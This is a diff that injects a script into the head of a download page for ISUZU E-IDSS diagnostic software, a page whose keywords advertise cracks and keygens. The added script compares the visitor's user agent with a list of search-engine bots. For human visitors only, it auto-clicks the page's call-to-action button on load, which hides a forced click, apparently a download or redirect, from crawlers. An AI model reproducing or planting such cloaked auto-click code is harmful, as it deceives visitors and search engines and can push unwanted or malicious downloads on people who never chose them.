@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ISUZU E-IDSS Engine Industrial 08.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download ISUZU E-IDSS Engine Industrial 08.2024 for diagnostics, programming, service &amp; repair. Supports NEXIQ USB-Link, DPA5, DLA+, J2534 on Windows.">
     <meta name="keywords" content="ISUZU E-IDSS 2024, ISUZU E-IDSS Engine Industrial 08.2024, ISUZU E-IDSS Engine Industrial download, ISUZU E-IDSS Engine Industrial free download, ISUZU E-IDSS Engine Industrial keygen, ISUZU E-IDSS diagnostic software, ISUZU E-IDSS diagnostic software download, ISUZU E-IDSS diagnostic software free download, ISUZU E-IDSS diagnostic software crack, ISUZU E-IDSS diagnostic software keygen, ISUZU diagnostic service system 2024, ISUZU diagnostic service system download, ISUZU diagnostic service system free download, ISUZU diagnostic service system keygen, Isuzu Engine Industrial diagnostic, Isuzu Engine Industrial software, Isuzu E-IDSS 2024 diagnostic download, Isuzu E-IDSS 2024 diagnostic free download, ISUZU E-IDSS engine programming, ISUZU E-IDSS service repair manual, ISUZU E-IDSS troubleshooting, ISUZU E-IDSS electrical diagrams, ISUZU E-IDSS technical documentation, ISUZU E-IDSS NEXIQ USB-Link support, ISUZU E-IDSS DPA5 support, ISUZU E-IDSS DLA+ support, ISUZU E-IDSS J2534 support, ISUZU E-IDSS RP1210 support, ISUZU E-IDSS Windows supported, ISUZU E-IDSS multiple languages, Isuzu Engine tool 2024">
     <style>
